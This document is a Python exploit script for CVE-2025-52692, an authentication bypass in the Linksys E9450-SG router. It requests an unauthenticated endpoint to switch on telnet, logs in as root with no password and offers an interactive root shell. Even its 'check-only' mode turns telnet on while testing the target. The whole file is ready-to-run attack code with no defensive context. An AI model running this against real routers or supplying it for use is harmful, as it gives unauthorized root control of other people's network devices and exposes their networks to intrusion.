#!/usr/bin/env python3

import sys
import argparse
import time
import telnetlib
import requests
from typing import Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class ExploitResult(Enum):
    SUCCESS = "success"
    TELNET_ENABLED = "telnet_enabled"
    SHELL_OBTAINED = "shell_obtained"
    FAILED = "failed"
    ERROR = "error"


@dataclass
class TargetConfig:
    host: str
    http_port: int = 80
    telnet_port: int = 23
    timeout: int = 10
    verify_ssl: bool = False


class LinksysE9450Exploit:
    
    TELNET_ENABLE_ENDPOINT = "/LOGIN/API/obj/en_telnet"
    
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session = requests.Session()
    
    @property
    def base_url(self) -> str:
        return f"http://{self.config.host}:{self.config.http_port}"
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Optional[requests.Response]:
        url = f"{self.base_url}{endpoint}"
        kwargs.setdefault("timeout", self.config.timeout)
        kwargs.setdefault("verify", self.config.verify_ssl)
        
        try:
            return self.session.request(method, url, **kwargs)
        except requests.exceptions.RequestException:
            return None
    
    def check_http_alive(self) -> bool:
        response = self._request("GET", "/")
        return response is not None
    
    def check_telnet_open(self) -> bool:
        try:
            tn = telnetlib.Telnet(self.config.host, self.config.telnet_port, timeout=3)
            tn.close()
            return True
        except Exception:
            return False
    
    def enable_telnet(self) -> bool:
        response = self._request("GET", self.TELNET_ENABLE_ENDPOINT)
        
        if response is None:
            return False
        
        return response.status_code in [200, 204, 302]
    
    def connect_telnet(self) -> Tuple[bool, Optional[telnetlib.Telnet]]:
        try:
            tn = telnetlib.Telnet(self.config.host, self.config.telnet_port, timeout=self.config.timeout)
            
            tn.read_until(b"login: ", timeout=5)
            tn.write(b"root\n")
            
            time.sleep(1)
            
            tn.write(b"id\n")
            output = tn.read_until(b"#", timeout=3)
            
            if b"uid=0" in output or b"root" in output:
                return True, tn
            
            return True, tn
            
        except Exception:
            return False, None
    
    def execute(self) -> ExploitResult:
        if not self.check_http_alive():
            return ExploitResult.ERROR
        
        if self.check_telnet_open():
            success, tn = self.connect_telnet()
            if success and tn:
                tn.close()
                return ExploitResult.SHELL_OBTAINED
        
        if not self.enable_telnet():
            return ExploitResult.FAILED
        
        time.sleep(2)
        
        if not self.check_telnet_open():
            return ExploitResult.FAILED
        
        success, tn = self.connect_telnet()
        if success:
            if tn:
                tn.close()
            return ExploitResult.SHELL_OBTAINED
        
        return ExploitResult.TELNET_ENABLED
    
    def get_interactive_shell(self) -> Optional[telnetlib.Telnet]:
        if not self.check_telnet_open():
            if not self.enable_telnet():
                return None
            time.sleep(2)
        
        try:
            tn = telnetlib.Telnet(self.config.host, self.config.telnet_port, timeout=self.config.timeout)
            tn.read_until(b"login: ", timeout=5)
            tn.write(b"root\n")
            time.sleep(1)
            return tn
        except Exception:
            return None


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CVE-2025-52692: Linksys E9450-SG Authentication Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="HTTP port")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Connection timeout")
    parser.add_argument("--interactive", action="store_true", help="Get interactive shell")
    parser.add_argument("--check-only", action="store_true", help="Only check if vulnerable")
    
    return parser.parse_args()


def main() -> int:
    args = parse_arguments()
    
    config = TargetConfig(
        host=args.target,
        http_port=args.port,
        timeout=args.timeout
    )
    
    exploit = LinksysE9450Exploit(config)
    
    print(f"\n[*] Target: {config.host}")
    print(f"[*] CVE-2025-52692: Linksys E9450-SG Authentication Bypass\n")
    
    if not exploit.check_http_alive():
        print("[-] Target HTTP is not reachable")
        return 1
    
    print("[+] Target HTTP is alive")
    
    if args.check_only:
        print("[*] Checking if telnet can be enabled...")
        
        if exploit.check_telnet_open():
            print("[!] Telnet already open - likely vulnerable or already exploited")
            return 0
        
        if exploit.enable_telnet():
            time.sleep(2)
            if exploit.check_telnet_open():
                print("[!] VULNERABLE - Telnet enabled without authentication")
                return 0
        
        print("[?] Could not confirm vulnerability")
        return 2
    
    print("[*] Step 1: Bypassing authentication via /LOGIN/API/obj/en_telnet")
    
    result = exploit.execute()
    
    if result == ExploitResult.SHELL_OBTAINED:
        print("[!] ROOT SHELL OBTAINED")
        print(f"[+] Connect with: telnet {config.host} 23")
        print("[+] Login as: root (no password)")
        
        if args.interactive:
            print("\n[*] Entering interactive shell...\n")
            tn = exploit.get_interactive_shell()
            if tn:
                tn.interact()
        
        return 0
    
    elif result == ExploitResult.TELNET_ENABLED:
        print("[+] Telnet enabled but could not verify shell")
        print(f"[+] Try: telnet {config.host} 23")
        return 0
    
    else:
        print("[-] Exploit failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())
